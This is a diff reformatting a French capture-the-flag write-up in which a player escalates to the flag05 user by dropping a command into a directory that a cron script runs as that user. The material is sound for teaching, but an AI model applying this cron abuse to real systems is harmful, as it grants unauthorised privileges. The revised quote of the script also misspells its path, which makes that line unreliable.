@@ -1,23 +1,38 @@
-# message
-quand on se co on a le message `You have a new mail`
+# Message
 
-je cherche avec un find
-`find / -name mail 2>/dev/null`
+Quand on se connecte, on a le message :
 
-output
+```
+You have a new mail
+```
+
+Je cherche avec un `find` :
+
+```bash
+find / -name mail 2>/dev/null
+```
+
+Output :
+
 ```
 /usr/lib/byobu/mail
 /var/mail
 /var/spool/mail 
 /rofs/usr/lib/byobu/mail 
 /rofs/var/mail 
-/rofs/var/spool/mail```
+/rofs/var/spool/mail
+```
 
-je cherche le mail
+Je cherche ensuite le mail.
 
-j'examine les fichier et check un a un
-ls `find / -name mail 2>/dev/null` 
-output
+J’examine les fichiers et je les vérifie un à un :
+
+```bash
+ls `find / -name mail 2>/dev/null`
+```
+
+Output :
+
 ```
 /rofs/usr/lib/byobu/mail  /usr/lib/byobu/mail  
 
@@ -31,44 +46,77 @@ level05
 level05 
 
 /var/spool/mail: 
-level05 ```
-
-j'ai dans certain fichier level5 un output:
-
-`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
-
-`*/2 * * * *` indique que c'est une crontab comme sur b2br
-
-`su -c` est une commande pour switch de user et exec une commande en tant que `flag5`
-
-la ligne nous indique que toute les 2mn elle va executer le script `usr/sbin/openarenaserver` en tant que `flag05`
-
-
-# ouvrir script
-
-je connais deja mon script et je peux le cat, mais il y a aussi une deuxieme methode si on cherche comme direct le flag05 via user
-
-on check le groupe comme sur le level00
-find / -user flag05 2>/dev/null
-si on cat sur le fichier:
-`/usr/sbin/openarenaserver`
-output du script:
+level05
 ```
+
+Dans certains fichiers `level05`, j’ai cet output :
+
+```
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+- `*/2 * * * *` indique que c’est une **crontab** qui s’exécute **toutes les 2 minutes**
+- `su -c` permet d’exécuter une commande en tant qu’un autre utilisateur
+- Ici la commande exécutée est :
+
+```
+sh /usr/sbin/openarenaserver
+```
+
+Elle est lancée **en tant que `flag05`**.
+
+---
+
+# Ouvrir le script
+
+Je connais déjà le script et je peux le lire avec `cat`.  
+Mais il existe aussi une deuxième méthode : chercher directement les fichiers appartenant à `flag05` :
+
+```bash
+find / -user flag05 2>/dev/null
+```
+
+Si on fait un `cat` sur le fichier :
+
+```
+/usr/sbin/openarenaserver
+```
+
+on obtient :
+
+```sh
 #!/bin/sh
 
-for i in /opt/openarenaserver/* ; do
-	(ulimit -t 5; bash -x "$i")
-	rm -f "$i"
-done```
+for i in /opt/openarenasererver/* ; do
+    (ulimit -t 5; bash -x "$i")
+    rm -f "$i"
+done
+```
 
+Le script exécute **tous les fichiers dans `/opt/openarenaserver/`** avec `bash`, pendant maximum **5 secondes**, puis les supprime.
 
-le script execute tous les fichiers dans /opt/openarenaserver/ toute les 5secondes  et delete apres
+---
 
-# exploit
+# Exploit
 
-pour exploit on va juste rentrer une commande
-`echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05`
+Pour exploiter ça, on va simplement écrire une commande dans ce dossier :
 
-ca va creer un fichier `flag5` dans `/opt/openarenaserver` qui contient la commande `getflag > /tmp/flag05`, quand la commande cron run, le script s'execute et save l'output `getflag` dans `/tmp/flag05`.
+```bash
+echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
+```
 
-plus que as atteindre le cron dans 2mn et check l'output dans /tmp/flag05
+Cela crée un fichier `flag05` dans `/opt/openarenaserver` contenant la commande :
+
+```
+getflag > /tmp/flag05
+```
+
+Quand la crontab s’exécute (toutes les 2 minutes), le script lance notre fichier avec les privilèges `flag05`, puis écrit le résultat de `getflag` dans `/tmp/flag05`.
+
+Il ne reste plus qu’à attendre 2 minutes, puis lire le fichier :
+
+```bash
+cat /tmp/flag05
+```
+et on obtient le flag
+
